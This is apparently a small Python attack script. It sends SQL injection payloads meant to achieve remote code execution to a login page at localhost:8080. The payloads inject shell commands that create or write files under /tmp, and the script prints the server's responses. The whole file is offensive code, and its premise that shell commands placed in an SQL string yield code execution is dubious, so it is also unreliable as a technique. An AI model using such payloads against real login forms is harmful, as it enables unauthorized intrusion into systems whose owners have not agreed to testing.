import requests

# Target URL
TARGET_URL = "http://localhost:8080/Login"

# SQL Injection payloads for RCE
SQL_RCE_PAYLOADS = [
    "'; touch /tmp/pwned; --",  # Create a file on the server
    "'; echo 'hacked' > /tmp/test.txt; --",  # Write data into a file
]




def test_sql_rce(url):
    print("[*] Testing SQL Injection for potential RCE...")
    for payload in SQL_RCE_PAYLOADS:
        params = {
            "email": payload,  # Replace with actual field names
            "password": "test",
            "role": "user"
        }
        try:
            response = requests.get(url, params=params, timeout=5)
            print(f"[*] Payload: {payload}")
            print(f"Response code: {response.status_code}")
            print("Response preview:")
            print(response.text[:300])  # Print the first 300 characters of the response
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")

# Main
if __name__ == "__main__":
    print("[*] Starting SQL Injection RCE test...")
    test_sql_rce(TARGET_URL)
